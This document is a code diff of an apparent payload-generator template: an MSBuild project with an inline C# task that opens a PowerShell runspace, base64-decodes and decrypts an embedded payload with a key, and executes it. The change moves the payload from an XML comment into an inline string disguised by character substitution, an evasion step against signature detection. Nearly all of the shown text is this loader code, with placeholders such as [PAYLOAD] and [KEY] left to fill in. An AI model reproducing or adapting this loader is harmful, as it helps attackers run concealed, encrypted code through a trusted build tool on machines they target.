@@ -1,6 +1,3 @@
-<!--
-[PAYLOAD]
--->
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
   <Target Name="VAR1"[CONDITION]>
    <VAR1 />
@@ -38,42 +35,38 @@
 		
 		public class VAR2 :  Task, ITask {	
 			public override bool Execute() {
-				string[] VAR3 = Environment.GetCommandLineArgs();
-			
+				byte[] VAR9 = {[KEY]};
 				Runspace VAR4 = RunspaceFactory.CreateRunspace();
 				VAR4.Open();
 				RunspaceInvoke VAR5 = new RunspaceInvoke(VAR4);
 				Pipeline VAR12 = VAR4.CreatePipeline();
-				
-				StreamReader VAR6 = File.OpenText(VAR3[1]);
-				StringBuilder VAR7 = new StringBuilder();
-				string VAR8;
-				while((VAR8 = VAR6.ReadLine()) != null) {
-						if(String.Equals(VAR8, "-->")) {
-							byte[] VAR9 = {[KEY]};
-							byte[] VAR10 = Convert.FromBase64String(VAR7.ToString());
-							string VAR11 = Encoding.UTF8.GetString(VAR16.VAR28(VAR9, VAR10));
-						
-							VAR12.Commands.AddScript(VAR11);
-							VAR12.Commands.Add("Out-String");
-							Collection<PSObject> VAR13 = VAR12.Invoke();
-							VAR4.Close();
-							
-							StringBuilder VAR14 = new StringBuilder();
-							foreach(PSObject VAR15 in VAR13) {
-								VAR14.AppendLine(VAR15.ToString());
-							}
-							Console.Write(VAR14.ToString());
-							return true;
-						}
-						if(!String.Equals(VAR8, "<!--")) {
-							VAR7.AppendLine(VAR8);
-						}
+				string VAR8 = VAR60.VAR61("[PAYLOAD]");
+
+				byte[] VAR10 = Convert.FromBase64String(VAR8);
+				string VAR11 = Encoding.UTF8.GetString(VAR16.VAR28(VAR9, VAR10));
+
+				VAR12.Commands.AddScript(VAR11);
+				VAR12.Commands.Add("Out-String");
+				Collection<PSObject> VAR13 = VAR12.Invoke();
+				VAR4.Close();
+
+				StringBuilder VAR14 = new StringBuilder();
+				foreach(PSObject VAR15 in VAR13) {
+					VAR14.AppendLine(VAR15.ToString());
 				}
+				Console.Write(VAR14.ToString());
 				return true;
 			}
 		}
 		
+		public class VAR60 {
+			public static string VAR61(string VAR62) {
+				string VAR63 = "[PATTERN_1]";
+				string VAR64 = "[PATTERN_2]";
+				return VAR62.Replace(VAR63, "m").Replace(VAR64, "V");
+			}
+		}
+
 		public class VAR16 {
 			public static byte[] VAR17(byte[] VAR18, byte[] VAR19) {
 				int VAR20, VAR21, VAR22, VAR23, VAR24;
